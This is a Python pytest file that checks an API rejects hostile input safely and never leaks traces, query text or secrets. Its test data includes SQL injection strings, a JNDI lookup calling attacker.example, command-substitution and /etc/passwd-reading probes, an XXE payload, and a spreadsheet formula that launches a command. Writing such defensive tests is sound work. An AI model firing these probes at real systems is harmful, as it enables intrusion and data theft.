"""Untrusted input fails safely and boundedly (plansecurity SP-4).

The gate's exit criteria are the assertions here: no injection, no parser
differential, malformed input returns 4xx and never 500, and no stack trace, SQL
text, filesystem path, or environment value reaches a response.

The last one is worth stating plainly, because it is the criterion most easily
satisfied by accident and most easily lost by accident. A framework that returns
a tidy 500 today starts echoing exception text the first time someone enables a
debug flag, and nothing fails until an attacker reads the response.
"""

from __future__ import annotations

import json
import uuid

import psycopg
import pytest
from abx_api.main import app
from abx_api.request_guard import has_null_byte
from abx_api.settings import settings
from conftest import _delete_tenant_data, requires_stack
from fastapi.testclient import TestClient

ADMIN = {"X-ABX-Admin-Key": "dev-admin-key"}

#: Strings that must never reach a response body, whatever goes wrong.
LEAK_MARKERS = (
    "traceback",
    "psycopg",
    "clickhouse",
    "select ",
    "insert into",
    "c:\\users",
    "/home/",
    "site-packages",
    "abx_payload_master_key",
    "dev-admin-key",
    settings.payload_master_key.lower(),
)

INJECTION_PROBES = [
    "' OR '1'='1",
    "'; DROP TABLE tenants;--",
    '" OR 1=1 --',
    "1' UNION SELECT null,null,null--",
    "${jndi:ldap://attacker.example/a}",
    "{{7*7}}",
    "../../etc/passwd",
    "..\\..\\windows\\system32",
    "$(whoami)",
    "`id`",
    "|cat /etc/passwd",
    "<script>alert(1)</script>",
    "\u202eevil",           # right-to-left override
    "ＡＤＭＩＮ",              # fullwidth confusable
    "a" * 4096,
]


@pytest.fixture(scope="module")
def probe_tenant():
    from abx_api.auth import new_ingest_token

    with psycopg.connect(settings.pg_dsn, autocommit=True) as conn:
        row = conn.execute(
            "INSERT INTO tenants (name) VALUES (%s) RETURNING id",
            (f"sp4-{uuid.uuid4().hex[:8]}",),
        ).fetchone()
        assert row is not None
        tenant_id = str(row[0])
        token, token_hash = new_ingest_token()
        conn.execute(
            "INSERT INTO ingest_tokens (tenant_id, token_hash, label) VALUES (%s,%s,'sp4')",
            (tenant_id, token_hash),
        )
    yield tenant_id, token
    with psycopg.connect(settings.pg_dsn, autocommit=True) as conn:
        _delete_tenant_data(conn, tenant_id)
        conn.execute("DELETE FROM tenants WHERE id = %s", (tenant_id,))


def assert_no_leak(response, context: str) -> None:
    body = response.text.lower()
    for marker in LEAK_MARKERS:
        if marker and marker in body:
            raise AssertionError(f"{context}: response leaked {marker!r}: {response.text[:300]}")


# -- injection and metacharacters ----------------------------------------------

@requires_stack
@pytest.mark.parametrize("probe", INJECTION_PROBES)
@pytest.mark.parametrize("field", ["severity", "provider", "finding_type"])
def test_metacharacters_are_data_not_code(probe: str, field: str, probe_tenant) -> None:
    """Every filter is a bound parameter, so a metacharacter is just a value.

    The assertion is deliberately "no server error and no leak" rather than
    "empty list": a probe that happens to match a real value should return that
    value. What must never happen is the string changing the shape of the query.
    """
    tenant_id, _ = probe_tenant
    response = TestClient(app, raise_server_exceptions=False).get(
        "/v1/dashboard/findings",
        params={"tenant_id": tenant_id, field: probe},
        headers=ADMIN,
    )
    assert response.status_code < 500, (field, probe, response.status_code)
    assert_no_leak(response, f"{field}={probe!r}")


@requires_stack
def test_the_tenants_table_still_exists_after_the_drop_probes(probe_tenant) -> None:
    """The negative control for the tests above: prove nothing was executed."""
    tenant_id, _ = probe_tenant
    with psycopg.connect(settings.pg_dsn, autocommit=True) as conn:
        row = conn.execute("SELECT count(*) FROM tenants WHERE id = %s", (tenant_id,)).fetchone()
    assert row is not None and row[0] == 1


# -- null bytes ----------------------------------------------------------------

@requires_stack
@pytest.mark.parametrize(
    "params",
    [
        {"severity": "\x00"},
        {"provider": "\x00"},
        {"finding_type": "a\x00b"},
    ],
)
def test_a_null_byte_is_refused_at_the_edge(params: dict[str, str], probe_tenant) -> None:
    """Postgres rejects NUL in a text parameter, so this used to be a 500.

    Four parameters across two routers hit it, and every future string filter
    would have too, which is why the check is at the edge rather than per route.
    """
    tenant_id, _ = probe_tenant
    response = TestClient(app, raise_server_exceptions=False).get(
        "/v1/dashboard/findings", params={"tenant_id": tenant_id, **params}, headers=ADMIN
    )
    assert response.status_code == 400, (params, response.status_code, response.text[:200])
    assert_no_leak(response, f"null byte {params}")


def test_the_null_byte_check_recognises_both_encodings() -> None:
    """A caller sends %00; the framework hands the handler \\x00. Both must match."""
    assert has_null_byte(b"severity=%00")
    assert has_null_byte(b"severity=%2500") is False  # double-encoded is literally "%00" text
    assert has_null_byte(b"severity=\x00")
    assert has_null_byte(b"severity=high") is False


# -- parser differentials ------------------------------------------------------

@requires_stack
def test_a_non_json_body_is_rejected_rather_than_reinterpreted(probe_tenant) -> None:
    """XML where JSON is expected must not reach an XML parser at all.

    If any layer were willing to parse this, the DOCTYPE would be an external
    entity read of a local file.
    """
    _, token = probe_tenant
    client = TestClient(app, raise_server_exceptions=False)
    xxe = (
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
        "<r>&x;</r>"
    )
    for content_type in ("application/xml", "text/xml", "application/x-www-form-urlencoded"):
        response = client.post(
            "/v1/ingest",
            headers={"Authorization": f"Bearer {token}", "Content-Type": content_type},
            content=xxe,
        )
        assert response.status_code == 422, (content_type, response.status_code)
        assert "root:" not in response.text
        assert_no_leak(response, f"xxe via {content_type}")


@requires_stack
def test_a_method_override_header_does_not_change_the_method(probe_tenant) -> None:
    """Honouring it would let a POST reach a route the guard table never sees."""
    _, token = probe_tenant
    response = TestClient(app, raise_server_exceptions=False).post(
        "/v1/ingest",
        headers={
            "Authorization": f"Bearer {token}",
            "X-HTTP-Method-Override": "DELETE",
            "X-Method-Override": "DELETE",
        },
        json={"events": []},
    )
    # Reaches the POST handler and fails its own validation, rather than being
    # rerouted to a DELETE that does not exist.
    assert response.status_code == 422, response.status_code


@requires_stack
def test_deeply_nested_json_does_not_exhaust_the_server(probe_tenant) -> None:
    """A 400-deep object is a stack-depth attack on the parser, not a payload."""
    _, token = probe_tenant
    nest: dict = {"a": None}
    cursor = nest
    for _ in range(400):
        cursor["a"] = {"a": None}
        cursor = cursor["a"]
    response = TestClient(app, raise_server_exceptions=False).post(
        "/v1/ingest", headers={"Authorization": f"Bearer {token}"}, json=nest
    )
    assert response.status_code == 422, response.status_code
    assert_no_leak(response, "deep nesting")


@requires_stack
def test_an_oversized_body_is_refused_before_it_is_parsed(probe_tenant) -> None:
    """The bound exists so a large body costs a header read, not a parse."""
    _, token = probe_tenant
    oversized = b'{"events":[' + b'{"x":"' + b"A" * (70 * 1024 * 1024) + b'"}' + b"]}"
    response = TestClient(app, raise_server_exceptions=False).post(
        "/v1/ingest",
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        content=oversized,
    )
    assert response.status_code == 413, response.status_code


# -- error hygiene -------------------------------------------------------------

@requires_stack
def test_no_response_carries_a_stack_trace_or_query_text(probe_tenant) -> None:
    """Sweep the shapes most likely to produce an unhandled error."""
    tenant_id, token = probe_tenant
    client = TestClient(app, raise_server_exceptions=False)
    attempts = [
        client.get("/v1/dashboard/findings", params={"tenant_id": "not-a-uuid"}, headers=ADMIN),
        client.get("/v1/dashboard/credentials/not-a-uuid", params={"tenant_id": tenant_id},
                   headers=ADMIN),
        client.get("/v1/no-such-route", headers=ADMIN),
        client.post("/v1/ingest", headers={"Authorization": f"Bearer {token}"},
                    content=b"{not json"),
        client.get("/v1/replay/sessions/" + "x" * 500, params={"tenant_id": tenant_id},
                   headers=ADMIN),
        client.get("/v1/chain/verify", params={"tenant_id": tenant_id}, headers=ADMIN),
    ]
    for index, response in enumerate(attempts):
        assert response.status_code < 500, (index, response.status_code, response.text[:200])
        assert_no_leak(response, f"attempt {index}")


@requires_stack
def test_a_rejected_ingest_does_not_echo_the_token(probe_tenant) -> None:
    """An error that repeats the credential turns a log into a secret store."""
    _, token = probe_tenant
    response = TestClient(app, raise_server_exceptions=False).post(
        "/v1/ingest", headers={"Authorization": f"Bearer {token}"}, json={"events": "wrong-type"}
    )
    assert response.status_code == 422
    assert token not in response.text


# -- export safety -------------------------------------------------------------

@requires_stack
@pytest.mark.parametrize("formula", ["=cmd|'/c calc'!A1", "+1+1", "-1+1", "@SUM(1:2)", "\t=1+1"])
def test_csv_exports_neutralise_spreadsheet_formulas(formula: str) -> None:
    """A recorded value beginning with = is executed by Excel on open.

    The export path carries attacker-controlled text by design, so this is a
    delivery mechanism rather than a display quirk.
    """
    from abx_api.export_safety import csv_cell

    rendered = csv_cell(formula)
    assert not rendered.lstrip().startswith(("=", "+", "-", "@")), rendered
    assert formula.strip().lstrip("=+-@\t") in rendered or rendered.startswith("'")


@requires_stack
def test_ingest_rejects_a_batch_larger_than_the_configured_ceiling(probe_tenant) -> None:
    """Bounded before expensive work, not while doing it."""
    _, token = probe_tenant
    event = {
        "event_id": str(uuid.uuid4()), "agent_id": "a", "session_id": "s", "seq": 0,
        "ts": "2026-07-31T00:00:00.000Z", "source": "mcp_tap", "event_type": "mcp_request",
        "operation": {"name": "x", "outcome": "success"}, "resource_refs": [], "payload": None,
    }
    body = json.dumps({"events": [event] * (settings.max_batch_events + 1)})
    response = TestClient(app, raise_server_exceptions=False).post(
        "/v1/ingest",
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        content=body,
    )
    assert response.status_code in (413, 422), response.status_code
